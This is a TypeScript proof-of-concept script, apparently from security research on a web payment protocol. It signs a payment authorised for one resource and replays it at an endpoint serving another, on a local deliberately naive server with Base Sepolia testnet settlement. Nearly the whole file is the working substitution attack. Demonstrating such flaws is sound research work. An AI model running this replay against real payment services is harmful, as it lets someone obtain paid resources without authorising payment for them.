/**
 * Live cross-resource substitution against Base Sepolia.
 *
 * Sign a payment for resource A, present it to the endpoint serving resource B.
 * The naive server grants B and settles the payment on-chain, because nothing
 * binds the payment to the resource it was meant for. Prints the settled tx hash
 * to verify on BaseScan.
 *
 * Run the naive server first (npm run server), then: npm run attack:substitution
 */
import { obtainPaymentHeader } from "../pay.js";

const BASE = process.env.SERVER_URL ?? "http://localhost:4021";
const A = `${BASE}/report-A`;
const B = `${BASE}/report-B`;

async function stats(): Promise<{ granted: number; settled: { ok: boolean; transaction?: string }[] }> {
  return (await fetch(`${BASE}/__stats`)).json() as Promise<{
    granted: number;
    settled: { ok: boolean; transaction?: string }[];
  }>;
}

async function main(): Promise<void> {
  // Sign a payment for resource A, but do not submit it to A.
  const header = await obtainPaymentHeader(A);

  // Present that A-authorized payment to the endpoint serving B.
  const atB = await fetch(B, { headers: header });
  console.log(`B (endpoint serving a different resource): ${atB.status} ${await atB.text()}`);

  if (atB.status !== 200) {
    console.log("substitution did NOT land: B rejected the payment");
    process.exitCode = 1;
    return;
  }
  console.log("substitution landed: B granted a payment authorized for A");

  // Wait for the on-chain settlement, then show the tx hash.
  await new Promise((r) => setTimeout(r, 8000));
  const s = await stats();
  const settled = s.settled.find((o) => o.ok);
  console.log(
    settled?.transaction
      ? `settled on-chain: https://sepolia.basescan.org/tx/${settled.transaction}`
      : "settlement not yet observed (check /__stats again shortly)",
  );
}

main().catch((error: unknown) => {
  console.error(error);
  process.exitCode = 1;
});
